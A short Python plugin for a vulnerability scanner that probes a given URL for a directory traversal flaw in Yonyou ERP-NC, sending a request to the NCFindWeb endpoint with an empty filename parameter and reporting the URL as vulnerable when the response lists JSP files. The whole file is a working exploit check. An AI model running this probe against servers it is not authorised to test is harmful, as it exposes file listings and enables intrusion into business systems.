from poc import core

def check_erp(url):
    name = '用友ERP-NC 目录遍历漏洞'
    core.start_echo(name)
    path = "/NCFindWeb?service=IPreAlertConfigService&filename="
    r = core.get(url, path)
    if r:
        if "jsp" in r.text:
            core.end_echo(name, 'Payload：' + url + path)
            core.result(name, 'Payload：' + url + path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)
